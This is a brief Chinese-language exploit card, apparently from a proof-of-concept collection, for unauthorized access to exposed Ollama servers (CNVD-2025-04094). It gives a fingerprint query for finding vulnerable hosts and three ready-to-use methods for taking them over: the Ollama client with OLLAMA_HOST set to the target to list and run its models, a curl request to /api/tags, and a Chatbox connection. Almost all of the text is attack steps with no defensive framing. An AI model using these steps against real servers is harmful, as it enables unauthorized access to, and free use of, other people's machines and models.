# OLLAMA未授权访问（CNVD-2025-04094）

- **系统**：OLLAMA　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`app="Ollama"`
- **请求**：`GET /api/tags HTTP/1.1`

**请求体 / payload**
```
方法一：
本地需要搭建一个ollama服务
powershell设置目标主机地址
$env:OLLAMA_HOST="ip:port"
连接后查询
ollama list
调用连接地址模型
ollama run deepseek-r1:70b
方法二：
简单粗暴的直接使用curl命令执行
curl your-ip:port/api/tags
Content-Type: application/x-www-form-urlencoded
Host:
方法三：
chatbox连接访问 配置访问地址
选中配置的模型
```
- **预期**：200　|　—